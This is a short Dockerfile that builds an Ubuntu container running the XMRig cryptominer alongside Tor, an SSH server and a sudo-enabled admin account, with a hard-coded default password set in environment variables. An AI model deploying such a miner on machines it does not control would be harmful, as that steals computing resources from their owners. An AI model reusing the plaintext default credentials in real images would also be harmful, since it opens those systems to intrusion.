FROM ubuntu:latest

ENV XMRIG_VERSION=6.19.2
ENV DEFAULT_USER=xmrig
ENV DEFAULT_PASSWORD=xmrig123

RUN apt-get update -y
RUN apt-get install -y supervisor tor openssh-server sudo
RUN apt-get install -y git less groff curl unzip vim
RUN useradd -rm -d /home/admin -s /bin/bash -g root -G sudo -u 1000 admin
RUN service ssh start

RUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
RUN tar -xvf xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
RUN ls -al xmrig-${XMRIG_VERSION}
RUN cp xmrig-${XMRIG_VERSION}/* /usr/bin/

COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
COPY tor.rc /etc/tor/tor.rc
COPY scripts/*.bash /scripts/
COPY config.json /data/

EXPOSE 80

CMD ["/scripts/start.bash"]
